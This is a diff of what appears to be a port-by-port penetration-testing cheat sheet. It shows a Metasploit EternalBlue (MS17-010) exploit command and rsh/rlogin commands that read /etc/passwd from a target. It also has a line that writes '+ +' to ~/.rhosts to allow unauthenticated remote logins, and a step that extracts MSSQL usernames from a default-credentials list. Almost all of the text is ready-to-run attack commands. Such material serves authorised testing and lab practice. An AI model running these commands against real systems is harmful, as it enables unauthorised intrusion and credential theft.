@@ -621,10 +621,11 @@ download file.txt
 msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'
 
 [*] (512-514) RSERVICES
-rsh -l $USERNAME $TARGET cat /etc/passwd
-rlogin -l $USERNAME $TARGET cat /etc/passwd
 echo '+ +' > ~/.rhosts; chmod 600 ~/.rhosts
-rlogin $USERNAME@$TARGET
+rsh -l $USERNAME $TARGET
+rsh -l $USERNAME $TARGET cat /etc/passwd
+rlogin -l $USERNAME $TARGET
+rlogin -l $USERNAME $TARGET cat /etc/passwd
 
 [*] (1433) MSSQL
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
